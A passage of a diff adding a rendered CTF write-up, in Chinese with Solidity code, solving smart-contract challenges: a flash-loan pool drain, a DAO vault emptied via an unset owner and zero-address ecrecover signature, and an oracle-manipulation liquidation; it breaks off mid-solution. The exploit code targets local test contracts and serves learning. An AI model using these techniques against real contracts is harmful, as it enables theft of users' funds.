+<span class="w">                    </span><span class="nx">IERC3156FlashBorrower</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)),</span>
+<span class="w">                    </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span>
+<span class="w">                    </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">100</span><span class="p">,</span>
+<span class="w">                    </span><span class="s2">&quot;&quot;</span>
+<span class="w">                </span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">tokenToEth</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">        </span><span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">address</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">));</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">_token</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">pool</span><span class="p">.</span><span class="nx">tokenToEth</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">pool</span><span class="p">.</span><span class="nx">ethToToken</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">}();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+<span class="cm">/*////////////////////////////////////////////////////////////</span>
+<span class="cm">//                     TEST CONTRACT                        //</span>
+<span class="cm">////////////////////////////////////////////////////////////*/</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge6Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">SecureumToken</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">YieldPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">yieldPool</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">attacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;attacker&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;owner&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// setup pool with 10_000 ETH and ST tokens</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">start_liq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="nx">_000</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">owner</span><span class="p">),</span><span class="w"> </span><span class="nx">start_liq</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SecureumToken</span><span class="p">(</span><span class="nx">start_liq</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">yieldPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">YieldPool</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">increaseAllowance</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">yieldPool</span><span class="p">),</span><span class="w"> </span><span class="nx">start_liq</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">yieldPool</span><span class="p">.</span><span class="nx">addLiquidity</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">start_liq</span><span class="p">}(</span><span class="nx">start_liq</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// attacker starts with 0.1 ether</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">attacker</span><span class="p">),</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testExploitPool</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //               Add your hack below!               //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge6Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">Hack</span><span class="w"> </span><span class="nx">hack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Hack</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">}(</span><span class="nx">yieldPool</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">hack</span><span class="p">.</span><span class="nx">exploit</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">hack</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertGt</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">attacker</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;hacker should have more than 100 ether&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="7-crystal-dao">7. Crystal DAO 💎💎<a class="headerlink" href="#7-crystal-dao" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Rescue <code>100 ETH</code> from the DAO treasury.</p>
+</blockquote>
+<ul>
+<li>
+<p><code>DaoVaultImplementation</code> 继承了 <code>Initializable</code> 和 <code>EIP712Upgradeable</code>，因此 slot 0 不对应状态变量 <code>owner</code>，在调用 <code>initialize()</code> 后 <code>owner</code> 仍为默认值 <code>address(0)</code></p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">initialize</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">initializer</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// EIP712 init: name DaoWallet, version 1.0</span>
+<span class="w">    </span><span class="nx">__EIP712_init</span><span class="p">(</span><span class="s2">&quot;DaoWallet&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;1.0&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// postInit: set owner with gas optimizations</span>
+<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">sstore</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>由于未进行零地址检查，无效签名可通过校验</p>
+<div class="highlight"><pre><span></span><code><span class="nx">address</span><span class="w"> </span><span class="nx">signer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ecrecover</span><span class="p">(</span><span class="nx">hash</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="p">);</span>
+<span class="nx">require</span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">signer</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Only owner can execute!&quot;</span><span class="p">);</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_6">Exploit<a class="headerlink" href="#exploit_6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge7Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">FactoryDao</span><span class="w"> </span><span class="nx">factory</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitehat</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;whitehat&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">daoManager</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">daoManagerKey</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">IDaoVault</span><span class="w"> </span><span class="nx">vault</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">daoManager</span><span class="p">,</span><span class="w"> </span><span class="nx">daoManagerKey</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddrAndKey</span><span class="p">(</span><span class="s2">&quot;daoManager&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FactoryDao</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">daoManager</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IDaoVault</span><span class="p">(</span><span class="nx">factory</span><span class="p">.</span><span class="nx">newWallet</span><span class="p">());</span>
+
+<span class="w">        </span><span class="c1">// The vault has reached 100 ether in donations</span>
+<span class="w">        </span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testHack</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //               Add your hack below!               //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge7Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">execWithSignature</span><span class="p">(</span>
+<span class="w">            </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="nx">bytes32</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span>
+<span class="w">            </span><span class="nx">daoManager</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">daoManager</span><span class="p">.</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;The Dao manager&#39;s balance should be 100 ether&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="8-liquidatoooor">8. Liquidatoooor 🔱🔱<a class="headerlink" href="#8-liquidatoooor" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Drop the borrower's health account.</p>
+<p>Liquidate the borrower and get as much of his collateral as possible.</p>
+</blockquote>
+<ul>
+<li>
+<p>token0 (TKN) 的价格能够影响健康系数</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">healthFactor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">_user</span><span class="p">].</span><span class="nx">borrow</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// User has not borrowed any tokens, so health is theoretically infinite</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">collateralValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">users</span><span class="p">[</span><span class="nx">_user</span><span class="p">].</span><span class="nx">collateral</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">getPriceToken</span><span class="p">();</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">borrowValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">users</span><span class="p">[</span><span class="nx">_user</span><span class="p">].</span><span class="nx">borrow</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">hf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">collateralValue</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">CF</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">borrowValue</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// Includes 2 decimals</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">hf</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">getPriceToken</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">amm</span><span class="p">.</span><span class="nx">getPriceToken0</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>由于使用的是实时价格，通过 <code>swap()</code> 降低 token0 的价格，以降低健康系数并清算健康账户</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getPriceToken0</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">reserve1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1e18</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">reserve0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_7">Exploit<a class="headerlink" href="#exploit_7" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge8Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">Oiler</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">oiler</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">AMM</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">amm</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">ERC20</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">ERC20</span><span class="w"> </span><span class="nx">dai</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">superman</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/**</span>
+<span class="cm">         * @notice Create ERC20 tokens</span>
+<span class="cm">         */</span>
+<span class="w">        </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;Token&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TKN&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">dai</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;DAI token&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;DAI&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;TKN&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">dai</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;DAI&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="cm">/**</span>
+<span class="cm">         * @notice Deploy contant prodcut AMM with a TOKEN &lt;&gt; DAI pair</span>
+<span class="cm">         */</span>
+<span class="w">        </span><span class="nx">amm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">AMM</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">dai</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;amm&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="cm">/**</span>
+<span class="cm">         * @notice Deploy Lending contract. Accepts &#39;TOKEN&#39; as collateral and</span>
+<span class="cm">         * mints a &#39;dTOKEN&#39; underlying debt token.</span>
+<span class="cm">         */</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Oiler</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">oiler</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;oiler&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="cm">/**</span>
+<span class="cm">         * @notice Create 2 accounts and fund them.</span>
+<span class="cm">         * - Player starts with 100 TOKEN and 100 DAI</span>
+<span class="cm">         * - Superman starts with 200 TOKEN and 200 DAI,</span>
+<span class="cm">         * Superman adds 100 of each to the pool.</span>
+<span class="cm">         */</span>
+<span class="w">        </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;player&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">superman</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;Super-man&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">dai</span><span class="p">),</span><span class="w"> </span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="nx">superman</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">dai</span><span class="p">),</span><span class="w"> </span><span class="nx">superman</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">);</span>
+
+<span class="w">        </span><span class="cm">/**</span>
+<span class="cm">         * @notice Add liquidity to AMM pair.</span>
+<span class="cm">         */</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">superman</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">),</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">dai</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">),</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">amm</span><span class="p">.</span><span class="nx">addLiquidity</span><span class="p">(</span><span class="mf">100</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testSolution</span><span class="p">()</span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// Victim set up</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">superman</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">oiler</span><span class="p">),</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="mf">100</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">maxBorrow</span><span class="p">(</span><span class="nx">superman</span><span class="p">);</span><span class="w"> </span><span class="c1">// Always account for 2 Decimal places</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">borrow</span><span class="p">(</span><span class="mf">75</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">healthFactor</span><span class="p">(</span><span class="nx">superman</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// Player initial balance is of 100 $TOKEN and 100 $DAI</span>
+<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Initial token balance: &quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>
